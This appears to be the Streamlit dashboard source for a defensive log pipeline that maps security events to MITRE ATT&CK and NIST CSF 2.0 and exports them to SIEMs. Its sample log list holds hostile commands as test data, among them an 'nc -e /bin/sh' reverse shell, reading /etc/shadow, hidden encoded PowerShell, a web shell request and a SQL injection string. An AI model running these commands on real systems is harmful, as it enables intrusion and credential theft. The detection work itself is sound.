import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import json
from typing import List
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import streamlit as st

from src.engine import LogNormalizer
from src.mapper import FrameworkMapper
from src.siem_connectors import SIEMExporter, SQLiteStorage

# sample logs
SAMPLE_LOGS: List[str] = [
    '2026-10-20T12:01:00Z EventID=4688 User=CORP\\jdoe SourceIP=10.0.1.15 Process=powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgA"',
    '2026-10-20T12:02:10Z EventID=4688 User=CORP\\admin SourceIP=10.0.1.20 Process=cmd.exe CommandLine="cmd.exe /c schtasks /create /tn Updater /tr C:\\temp\\run.bat /sc onlogon"',
    '2026-10-20T12:03:00Z EventID=4625 User=Administrator SourceIP=192.168.10.99 Process=winlogon.exe CommandLine="LogonType=10"',
    '2026-10-20T12:04:00Z EventID=1102 User=CORP\\admin SourceIP=10.0.1.20 Process=eventvwr.exe',
    '2026-10-20T12:05:00Z EventID=7045 User=SYSTEM SourceIP=10.0.1.20 Process=services.exe CommandLine="MaliciousSvc.exe"',
    '2026-10-20T12:06:00Z EventID=4720 User=CORP\\admin SourceIP=10.0.1.20 Process=lsass.exe',
    'Oct 20 14:22:01 bastion sshd[1234]: Failed password for invalid user admin from 198.51.100.42 port 54321 ssh2',
    'Oct 20 14:25:19 prod-db sudo[4321]: webuser : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c cat /etc/shadow',
    'type=EXECVE msg=audit(1729425600.123:456): argc=3 a0="/bin/bash" a1="-c" a2="nc -e /bin/sh 198.51.100.42 4444"',
    '203.0.113.5 - - [20/Oct/2026:14:30:00 +0000] "GET /uploads/shell.php HTTP/1.1" 200 512',
    '203.0.113.77 - - [20/Oct/2026:14:31:12 +0000] "POST /login.php?user=admin\' UNION SELECT 1,2,3-- HTTP/1.1" 403 1024'
]

### streamlit page and class init
st.set_page_config(
    page_title="LogBridge Framework | Dual Mode Cybersecurity Pipeline",
    layout="wide"
)

normalizer = LogNormalizer()
mapper = FrameworkMapper()
storage = SQLiteStorage()
exporter = SIEMExporter()

st.title("LogBridge Framework Executive Dashboard")
st.caption("Dual-Mode Cybersecurity Logging Pipeline | MITRE ATT&CK (v20) & NIST CSF 2.0")

### sidebar controls
def ingest_lines(lines: List[str]) -> int:
    parsed = normalizer.parse_batch(lines)
    enriched = mapper.enrich_batch(parsed)
    return storage.insert_batch(enriched)

with st.sidebar:
    st.header("Log Ingestion Controls")

    if st.button("Load Telemetry", use_container_width=True):
        count = ingest_lines(SAMPLE_LOGS)
        st.success(f"Ingested and enriched {count} events!")

    st.divider()
    raw_input = st.text_area(
        "Paste Raw Logs (EVTX, Syslog, Auditd, Web)",
        height=140,
        placeholder="Paste one or more log lines here..."
    )
    uploaded_file = st.file_uploader("Or upload a .log / .txt / .json file", type=["log", "txt", "json"])

    if st.button("Ingest & Enrich Custom Logs", use_container_width=True):
        custom_lines: List[str] = []
        if raw_input.strip():
            custom_lines.extend(raw_input.splitlines())
        if uploaded_file is not None:
            content = uploaded_file.read().decode("utf-8", errors="ignore")
            custom_lines.extend(content.splitlines())

        if custom_lines:
            count = ingest_lines(custom_lines)
            st.success(f"Ingested {count} custom events!")
        else:
            st.warning("Please paste logs or upload a file first")

    st.divider()
    if st.button("Clear Local Database", use_container_width=True):
        storage.clear_all()
        st.info("Local SQLite database cleared.")

###  Executive KPIs, NIST CSF 2.0 Gauge, & MITRE ATT&CK Heatmap
events = storage.fetch_all()
if not events:
    st.info("No logs in the local database yet. Click **Load Sample Telemetry** in the sidebar to begin!")
    st.stop()

# flatten nested dicts into DataFrame columns
rows = []
for e in events:
    mitre = e.get("mitre_mapping", {})
    nist = e.get("nist_csf_mapping", {})
    rows.append({
        "timestamp": e.get("timestamp", ""),
        "source_type": e.get("source_type", ""),
        "event_id": e.get("event_id", ""),
        "source_ip": e.get("source_ip", ""),
        "user": e.get("user", ""),
        "process_name": e.get("process_name", ""),
        "command_line": e.get("command_line", ""),
        "tactic": mitre.get("tactic", "Unknown"),
        "technique_id": mitre.get("technique_id", "Unknown"),
        "technique_name": mitre.get("technique_name", "Unknown"),
        "nist_function": nist.get("function", "Unknown"),
        "nist_category": nist.get("category", "Unknown"),
        "nist_subcategory": nist.get("subcategory", "Unknown")
    })
df = pd.DataFrame(rows)

### NIST Coverage & KPI Cards Render
total_defined_subcats = len({v["subcategory"] for v in mapper.nist_map.values()})
covered_subcats = df["nist_subcategory"].nunique()
coverage_pct = round(covered_subcats / max(total_defined_subcats, 1) * 100, 1)

col1, col2, col3, col4 = st.columns(4)
col1.metric("Total Enriched Events", len(df))
col2.metric("Unique ATT&CK Techniques", df["technique_id"].nunique())
col3.metric("NIST CSF 2.0 Coverage", f"{coverage_pct}%", f"{covered_subcats}/{total_defined_subcats} Subcategories")
col4.metric("Unique Source IPs", df["source_ip"].nunique())

st.divider()

### two sided chat columns
left_col, right_col = st.columns(2)

# NIST 2.0
with left_col:
    st.subheader("NIST CSF 2.0 Telemetry Coverage")
    gauge_fig = go.Figure(
        go.Indicator(
            mode="gauge+number",
            value=coverage_pct,
            number={"suffix": "%"},
            title={"text": "Active CSF Subcategory Coverage"},
            gauge={
                "axis": {"range": [0, 100]},
                "bar": {"color": "#00cc96"},
                "steps": [
                    {"range": [0, 50], "color": "#3b1f2b"},
                    {"range": [50, 80], "color": "#3d3522"},
                    {"range": [80, 100], "color": "#1e3a2f"}
                ],
            },
        )
    )
    gauge_fig.update_layout(height=320, margin=dict(l=20, r=20, t=40, b=20))
    st.plotly_chart(gauge_fig, use_container_width=True)

# MITRE ATT&CK Tatic & Technique Heatmap
with right_col:
    st.subheader("MITRE ATT&CK Technique Hit Map")
    heatmap_fig = px.density_heatmap(
        df,
        x="tactic",
        y="technique_id",
        text_auto=True,
        color_continuous_scale="Viridis",
        labels={"tactic": "MITRE Tactic", "technique_id": "Technique ID"}
    )
    heatmap_fig.update_layout(height=320, margin=dict(l=20, r=20, t=40, b=20))
    st.plotly_chart(heatmap_fig, use_container_width=True)

st.divider()

### Enriched Event Inspector & SIEM Forwarder tabs
tab_events, tab_siem = st.tabs(["Enriched Event Inspector", "SIEM Forwarder Mode"])

with tab_events:
    st.subheader("Normalized & Dual-Mode Event Log")
    st.dataframe(df, use_container_width=True, hide_index=True)

    with st.expander("View Raw Enriched JSON (Latest Event)"):
        st.json(events[0])

with tab_siem:
    st.subheader("Outbound SIEM Integration Pipeline")
    siem_target = st.radio(
        "Select Target SIEM Format",
        ["Splunk HEC (JSON)", "Microsoft Sentinel (Syslog CEF)", "Elastic Stack/Logstash (NDJSON)"],
        horizontal=True
    )

    if siem_target == "Splunk HEC (JSON)":
        col_url, col_token, col_dry = st.columns([2, 2, 1])
        hec_url = col_url.text_input("Splunk HEC URL", value="https://localhost:8088/services/collector/event")
        hec_token = col_token.text_input("HEC Token", value="00000000-0000-0000-0000-000000000000", type="password")
        dry_run = col_dry.checkbox("Dry Run Mode", value=True)

        if st.button("Push Enriched Events to Splunk HEC"):
            res = exporter.send_to_splunk_hec(events, hec_url=hec_url, hec_token=hec_token, dry_run=dry_run)
            st.json(res)
        else:
            st.caption("Previewing sample Splunk HEC envelope:")
            st.json(exporter.format_splunk_hec(events[0]))

    elif siem_target == "Microsoft Sentinel (Syslog CEF)":
        st.caption("Common Event Format (CEF) payload ready for Sentinel AMA/Syslog Forwarder:")
        cef_lines = "\n".join(exporter.format_sentinel_cef(e) for e in events[:10])
        st.code(cef_lines, language="text")

    else:
        st.caption("Bulk NDJSON payload ready for Logstash/Filebeat/Elasticsearch:")
        st.code(exporter.format_elastic_ndjson(events[:5]), language="json")